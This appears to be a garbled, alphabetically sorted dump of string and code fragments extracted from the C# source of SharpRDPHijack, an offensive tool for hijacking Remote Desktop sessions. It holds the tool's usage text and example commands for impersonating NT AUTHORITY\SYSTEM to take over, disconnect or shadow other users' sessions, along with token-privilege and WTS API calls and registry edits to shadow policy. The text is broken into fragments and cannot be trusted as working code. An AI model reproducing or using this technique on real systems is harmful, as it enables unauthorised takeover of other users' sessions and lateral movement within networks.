"(!AdjustTokenPrivilege(""SeDebugPrivilege"""
"(""    - For session hijacking, this utility must be run in an elevated context to connect to another session"""
"(""    - For session query, admin privileges or \""Remote Desktop Users\"" group membership is required on the target machine\n"""
"(""    - If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated"""
"(""    --console : Redirect session to console session instead of current (active"
"(""    --disconnect : Disconnect an active (remote"
"(""    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch"
"(""    --session=<ID> : Target session identifier"""
"(""    --shadow : Shadow an active session (experimental"
"(""    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches"
"(""    SharpRDPHijack.exe --session=2 --console\n"""
"(""    SharpRDPHijack.exe --session=2 --shadow --console\n"""
"(""    SharpRDPHijack.exe --session=3 --disconnect\n"""
"(""    SharpRDPHijack.exe --session=3 --shadow\n"""
"(""    SharpRDPHijack.exe --session=4 --password=P@ssw0rd\n"""
"(""    SharpRDPHijack.exe --session=6\n"""
"(""    SharpRDPHijack.exe --tsquery=localhost\n"""
"("""""
"(""----------------\nSharp RDP Hijack\n----------------\n"""
"(""Identity: "" + username"
"(""Session State: "" + state"
"(""SystemRoot"""
"(""[*] A proof-of-concept Remote Desktop (RDP"
"(""[*] Example Usage 1: Impersonate NT AUTHORITY\\SYSTEM to hijack session #6 and redirect to the current session"""
"(""[*] Example Usage 2: Impersonate NT AUTHORITY\\SYSTEM to hijack session #2 and redirect to the console session"""
"(""[*] Example Usage 3: Hijack Remote Desktop session #4 with knowledge of the logged-on user's password"""
"(""[*] Example Usage 4: Disconnect active session #3"""
"(""[*] Example Usage 5: Query the local host for RDP/TS session information"""
"(""[*] Example Usage 6: Shadow active session #3"""
"(""[*] Example Usage 7: Shadow inactive session #2 by redirecting the session to the console"""
"(""[*] Parameters:"""
"(""\n [-] Error: "" + e.Message + ""\n"""
"(""\nSession ID: "" + si.SessionId.ToString("
"(""\n[-] Could not adjust token privilege: SeDebugPrivilege\n"""
"(""\n[-] Could not impersonate target context from process: "" + proc + ""\n"""
"(""\n[-] Error: "" + ex.Message.ToString("
"(""\n[-] Failed to connect to session: "" + session.ToString("
"(""\n[-] For RDP hijack, this program must be run in elevated administrator context\n"""
"(""\n[-] For RDP session query, only use the '--tsquery' switch\n"""
"(""advapi32.dll"", ExactSpelling = true, SetLastError = true"
"(""advapi32.dll"", SetLastError = true"
"(""kernel32.dll"""
"(""kernel32.dll"", ExactSpelling = true"
"(""wtsapi32.dll"""
"(""wtsapi32.dll"", CharSet = CharSet.Auto, SetLastError = true"
"(""wtsapi32.dll"", SetLastError = true"
"(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle"
"(IntPtr PHThread, IntPtr Token"
"(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle"
"(IntPtr hServer, int Reserved, int Version, out IntPtr ppSessionInfo, out int pCount"
"(IntPtr hServer, int sessionId, WTS_INFO_CLASS wtsInfoClass, out IntPtr ppBuffer, out uint pBytesReturned"
"(IntPtr hServer, int sessionId, bool bWait"
"(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen"
"(IntPtr serverHandle, int sessionId"
"(IntPtr.Zero, duplicateTokenHandle"
"(IntPtr.Zero, session, true"
"(LayoutKind.Sequential, Pack = 1"
"(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY"
"(Win32.WTSEnumerateSessions(IntPtr.Zero, 0, 1, out pSessions, out dwSessionCount"
"(Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSDomainName, out buffer, out strLen"
"(Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSUserName, out buffer, out strLen"
"(arg.Split(new string[] { ""--session="" }, StringSplitOptions.None"
"(arg.StartsWith(""--console"""
"(arg.StartsWith(""--disconnect"""
"(arg.StartsWith(""--password="""
"(arg.StartsWith(""--session="""
"(arg.StartsWith(""--shadow"""
"(arg.StartsWith(""--tsquery="""
"(current, typeof(Win32.WTS_SESSION_INFO"
"(hproc, Win32.TOKEN_ALL_ACCESS, out htok"
"(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero"
"(int targetSessionId, int sourceSessionId, string password, bool wait"
"(new string[] { ""--password="" }, StringSplitOptions.None"
"(new string[] { ""--tsquery="" }, StringSplitOptions.None"
"(null, priv, ref tp.Luid"
"(password == """""
"(procToken, 2, out duplicateTokenHandle"
"(process.Handle, Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out procToken"
"(regKey, writable: true"
"(serverHandle, 0, 1, out pSessions, out dwSessionCount"
"(serverHandle, si.SessionId"
"(session, receiver, password, true"
"(shadowValue, 2, RegistryValueKind.DWord"
"(shadowValue, activePolicy, RegistryValueKind.DWord"
"(string host, string name, ref long pluid"
(!ImpersonateContext(proc
(!IsElevatedAdmin(
(!retVal
((System.IntPtr
(3000
(Exception e
(Exception ex
(INCLUDING NEGLIGENCE OR OTHERWISE
(IntPtr hServer
(IntPtr memory
(LayoutKind.Sequential
(PrincipalPolicy.WindowsPrincipal
(RDP
(STANDARD_RIGHTS_READ | TOKEN_QUERY
(UnmanagedType.Bool
(Win32.WTS_SESSION_INFO
(WindowsPrincipal
([MarshalAs(UnmanagedType.LPStr
(active
(activePolicy == -1
(activePolicy == -2
(add
(administrator
(and likely earlier versions
(args.Length == 0
(args.Length > 1
(attempt to
(buffer
(c
(connect
(console
(disconnect
(domainPtr
(e.g. logging off disconnected sessions after a timeout period in Group Policy
(either current session or console (if --console is specified
(experimental
(forcefully
(http://blog.gentilkiwi.com/securite/vol-de-session-rdp
(http://www.truesec.com 
(https://attack.mitre.org/techniques/T1563/002/
(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon
(https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsconnectsessiona
(https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsdisconnectsession
(https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
(https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980
(https://github.com/gentilkiwi/mimikatz
(https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
(https://twitter.com/monoxgas/status/1109892490566336512
(https://www.exploit-db.com/exploits/41607
(https://www.pinvoke.net/
(if not a value of 2
(int
(int i = 0; i < dwSessionCount; ++i
(int i = 0; i < dwSessionCount; i++
(int sessionId
(key == null
(more specifically - Wtsapi32
(myPrincipal.IsInRole(WindowsBuiltInRole.Administrator
(not required for other switches
(otherwise optional - not required for disconnect switch
(pSessions
(pSessions != IntPtr.Zero
(preferably in C#
(proc
(process.StartInfo
(regKey
(registryValue == null
(remote
(res != 0
(retVal
(retVal != 0
(serverHandle
(serverName
(session
(session < 0
(session_info.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive
(shadow
(shadowValue
(si.SessionId == console
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnectQuery
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnected
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDisconnected
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDown
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSIdle
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSInit
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSListen
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSReset
(si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSShadow
(string arg in args
(string priv
(string proc
(string serverName
(string[] args
(tscon.exe
(tsquery
(tsquery.Length > 0
(typeof(Win32.WTS_SESSION_INFO
(userPtr
